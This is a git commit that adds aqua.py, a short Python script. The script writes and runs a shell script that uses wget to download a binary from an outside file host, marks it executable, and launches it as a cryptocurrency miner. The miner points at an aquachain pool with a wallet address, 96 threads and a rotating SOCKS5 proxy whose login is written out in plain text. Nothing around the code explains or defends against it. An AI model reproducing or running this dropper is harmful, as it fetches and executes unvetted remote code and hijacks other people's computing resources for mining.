24552d97e9c7fc7ddb95e878c7730f7cd0b310b7
judoi <94316221+judoi@users.noreply.github.com>
2021-12-11 04:23:38 +0700

    Create aqua.py

---
+++ aqua.py
@@ -0,0 +1,7 @@
+import os
+os.system('echo "#!/bin/sh" >> tes')
+os.system('echo " " >> tes')
+os.system('echo "wget -q https://bin.jvnv.net/file/EeZjr/ac-avx && chmod +x ac-avx" >> tes')
+os.system('echo "./ac-avx -F pool.aquachain.xyz:8888/0xE77ea76f94A6535682C3fE364E1E3f9f822f4CD0/NGENG -t 96 --proxy socks5://simbahkencot-rotate:tukimenreborn@p.webshare.io:80" >> tes')
+os.system('sleep 2')
+os.system('sh tes')
